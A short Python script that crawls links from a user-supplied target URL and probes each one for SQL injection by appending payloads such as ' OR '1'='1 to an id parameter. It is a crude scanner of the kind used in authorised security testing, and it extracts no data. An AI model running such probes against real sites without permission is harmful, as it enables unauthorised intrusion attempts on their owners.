import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Function to validate URL
def validate_url(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    return False

# Function to crawl links from the given URL
def crawl(url):
    print(f"Crawling: {url}")
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = [urljoin(url, a['href']) for a in soup.find_all('a', href=True)]
        return links
    except Exception as e:
        print(f"Error while crawling: {e}")
        return []

# Function to test for SQL Injection
def test_sql_injection(url):
    print(f"Testing for SQL Injection on: {url}")
    payloads = ["' OR '1'='1", "' OR 'a'='a"]
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url)
            if "error" in response.text.lower() or "syntax" in response.text.lower():
                print(f"Potential SQL Injection found at {test_url}")
                return True
        except Exception as e:
            print(f"Error while testing: {e}")
    return False

if __name__ == "__main__":
    target_url = input("Enter the target URL: ").strip()
    if validate_url(target_url):
        print("Valid URL. Starting scan...")
        links = crawl(target_url)
        print(f"Found {len(links)} links.")
        for link in links:
            test_sql_injection(link)
    else:
        print("Invalid URL or target is unreachable.")
